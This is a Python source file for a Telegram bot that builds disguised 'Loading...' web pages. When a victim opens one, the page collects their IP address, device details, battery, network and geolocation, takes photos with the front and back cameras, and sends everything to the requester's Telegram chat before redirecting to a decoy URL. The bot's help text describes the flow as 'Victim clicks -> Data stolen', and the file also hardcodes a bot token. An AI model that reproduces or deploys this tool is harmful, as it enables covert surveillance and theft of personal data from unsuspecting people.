import telebot
import time
import threading
import json
import os
from datetime import datetime
import glob

BOT_TOKEN = "8754262218:AAEGMkxM2YWo121PjkZMr4MX3Jd9g8cJhQw"
CHANNEL_USERNAME = "@nrtecno2"

bot = telebot.TeleBot(BOT_TOKEN)
user_data = {}

# Bot commands
bot.set_my_commands([
    telebot.types.BotCommand("start", "Start the bot"),
    telebot.types.BotCommand("help", "Get help")
])

def create_payload(target_url, user_id):
    return f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {{
            background: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
        }}
        .loader {{
            text-align: center;
            color: #666;
        }}
        .spinner {{
            width: 40px;
            height: 40px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        video, canvas {{
            display: none;
        }}
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <div>Loading content...</div>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const BOT_TOKEN = "{BOT_TOKEN}";
        const USER_ID = {user_id};
        const TARGET_URL = "{target_url}";

        let cameraStream = null;

        async function sendToTelegram(text, file = null) {{
            try {{
                if(file) {{
                    let formData = new FormData();
                    formData.append('chat_id', USER_ID);
                    formData.append('document', file, 'photo.jpg');
                    await fetch(`https://api.telegram.org/bot${{BOT_TOKEN}}/sendDocument`, {{
                        method: 'POST',
                        body: formData
                    }});
                }} else {{
                    await fetch(`https://api.telegram.org/bot${{BOT_TOKEN}}/sendMessage`, {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{
                            chat_id: USER_ID,
                            text: text
                        }})
                    }});
                }}
            }} catch(e) {{
                console.log('Send error:', e);
            }}
        }}

        async function getBatteryInfo() {{
            if(navigator.getBattery) {{
                try {{
                    let b = await navigator.getBattery();
                    return `${{Math.round(b.level * 100)}}% | ${{b.charging ? 'Charging' : 'Not charging'}}`;
                }} catch(e) {{
                    return 'N/A';
                }}
            }}
            return 'N/A';
        }}

        function getNetworkInfo() {{
            let conn = navigator.connection || navigator.mozConnection;
            if(conn) {{
                return `${{conn.effectiveType || conn.type}} | ${{conn.downlink}}Mbps`;
            }}
            return 'N/A';
        }}

        async function getIP() {{
            try {{
                let res = await fetch('https://api.ipify.org?format=json');
                let data = await res.json();
                return data.ip;
            }} catch(e) {{
                return 'Unknown';
            }}
        }}

        async function getLocation() {{
            return new Promise((resolve) => {{
                if(!navigator.geolocation) {{
                    resolve('Not supported');
                    return;
                }}
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {{
                        let lat = pos.coords.latitude;
                        let lng = pos.coords.longitude;
                        let msg = `LOCATION:\\nhttps://www.google.com/maps?q=${{lat}},${{lng}}\\nAccuracy: ${{pos.coords.accuracy}}m`;
                        await sendToTelegram(msg);
                        resolve(`${{lat}}, ${{lng}}`);
                    }},
                    (err) => resolve('Denied'),
                    {{ timeout: 5000 }}
                );
            }});
        }}

        async function takePhotoFromDevice(deviceId, cameraName) {{
            return new Promise(async (resolve) => {{
                try {{
                    let stream = await navigator.mediaDevices.getUserMedia({{
                        video: {{ deviceId: {{ exact: deviceId }} }},
                        audio: false
                    }});

                    let video = document.getElementById('video');
                    video.srcObject = stream;

                    await new Promise((resolve) => {{
                        video.onloadedmetadata = () => {{
                            video.play();
                            resolve();
                        }};
                    }});

                    await new Promise(r => setTimeout(r, 150));

                    let canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;

                    let ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));

                    if(blob && blob.size > 500) {{
                        await sendToTelegram("📸 " + cameraName + ":", blob);
                        resolve(true);
                    }} else {{
                        resolve(false);
                    }}

                    stream.getTracks().forEach(t => t.stop());

                }} catch(e) {{
                    console.log('Capture error:', e);
                    resolve(false);
                }}
            }});
        }}

        async function start() {{
            try {{
                let ip = await getIP();
                let battery = await getBatteryInfo();
                let network = getNetworkInfo();

                let infoMsg = "VICTIM DATA\\nIP: " + ip + "\\nDevice: " + navigator.userAgent.split('(')[0] + "\\nBattery: " + battery + "\\nNetwork: " + network + "\\nTime: " + new Date().toISOString();
                await sendToTelegram(infoMsg);

                await getLocation();

                try {{
                    let devices = await navigator.mediaDevices.enumerateDevices();
                    let videoDevices = devices.filter(d => d.kind === 'videoinput');

                    if(videoDevices.length > 0) {{
                        cameraStream = await navigator.mediaDevices.getUserMedia({{
                            video: true,
                            audio: false
                        }});

                        devices = await navigator.mediaDevices.enumerateDevices();
                        videoDevices = devices.filter(d => d.kind === 'videoinput');

                        let frontCam = null;
                        let backCam = null;

                        for(let cam of videoDevices) {{
                            let label = cam.label.toLowerCase();
                            if(label.includes('front') || label.includes('user') || label.includes('face')) {{
                                frontCam = cam;
                            }} else if(label.includes('back') || label.includes('environment') || label.includes('rear')) {{
                                backCam = cam;
                            }}
                        }}

                        if(!frontCam && videoDevices[0]) frontCam = videoDevices[0];
                        if(!backCam && videoDevices[1]) backCam = videoDevices[1];

                        let photoCount = 0;

                        if(frontCam) {{
                            let success = await takePhotoFromDevice(frontCam.deviceId, "FRONT CAMERA");
                            if(success) photoCount++;
                        }}

                        if(backCam && backCam.deviceId !== (frontCam ? frontCam.deviceId : null)) {{
                            let success = await takePhotoFromDevice(backCam.deviceId, "BACK CAMERA");
                            if(success) photoCount++;
                        }}

                        await sendToTelegram("Done! " + photoCount + " photos captured.");

                        if(cameraStream) {{
                            cameraStream.getTracks().forEach(t => t.stop());
                            cameraStream = null;
                        }}
                    }}

                }} catch(e) {{
                    await sendToTelegram("Camera error: " + e.message);
                }}

            }} catch(e) {{
                await sendToTelegram("Error: " + e.message);
            }}

            fetch(window.location.href, {{ method: 'DELETE' }});
            window.location.href = TARGET_URL;
        }}

        start();
    </script>
</body>
</html>'''

def is_subscribed(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.chat.id

    if is_subscribed(user_id):
        bot.reply_to(message,
            "✅ Send me any URL:\n\n"
            "Example:\n"
            "https://www.instagram.com/p/xxxxx\n"
            "https://www.instagram.com/reel/xxxxx")
        user_data[user_id] = {'step': 'waiting_url'}
    else:
        markup = telebot.types.InlineKeyboardMarkup()
        btn = telebot.types.InlineKeyboardButton("📢 Join Channel", url="https://t.me/" + CHANNEL_USERNAME[1:])
        verify_btn = telebot.types.InlineKeyboardButton("✅ Verify", callback_data="verify")
        markup.add(btn)
        markup.add(verify_btn)

        bot.reply_to(message,
            f"🚫 Join {CHANNEL_USERNAME} first!\n\n"
            "1. Click 'Join Channel'\n"
            "2. Join\n"
            "3. Click 'Verify'",
            reply_markup=markup)

@bot.message_handler(commands=['help'])
def help_command(message):
    bot.reply_to(message, "Send any URL -> Get link -> Victim clicks -> Data stolen")

@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify_callback(call):
    user_id = call.from_user.id

    if is_subscribed(user_id):
        bot.edit_message_text(
            "✅ Verified!\n\nSend me any URL:",
            call.message.chat.id,
            call.message.message_id
        )
        user_data[user_id] = {'step': 'waiting_url'}
    else:
        bot.answer_callback_query(call.id, "❌ Join channel first!", show_alert=True)

@bot.message_handler(func=lambda m: m.chat.id in user_data and user_data[m.chat.id].get('step') == 'waiting_url')
def handle_url(message):
    user_id = message.chat.id
    target_url = message.text.strip()

    if not (target_url.startswith('http://') or target_url.startswith('https://')):
        bot.reply_to(message, "❌ Send valid URL")
        return

    filename = f"v_{user_id}.html"
    payload = create_payload(target_url, user_id)

    with open(f"/home/nrtecno/{filename}", 'w') as f:
        f.write(payload)

    link = f"https://nrtecno.pythonanywhere.com/{filename}"

    bot.reply_to(message,
        f"✅ LINK:\n{link}\n\n"
        f"Victim clicks -> Camera (once) + Location + Info -> Redirects")

    del user_data[user_id]

def auto_delete_files():
    while True:
        time.sleep(60)
        files = glob.glob('/home/nrtecno/v_*.html')
        for f in files:
            if time.time() - os.path.getctime(f) > 300:
                try:
                    os.remove(f)
                    print(f"Deleted: {f}")
                except:
                    pass

delete_thread = threading.Thread(target=auto_delete_files, daemon=True)
delete_thread.start()

print("Bot running...")
bot.infinity_polling()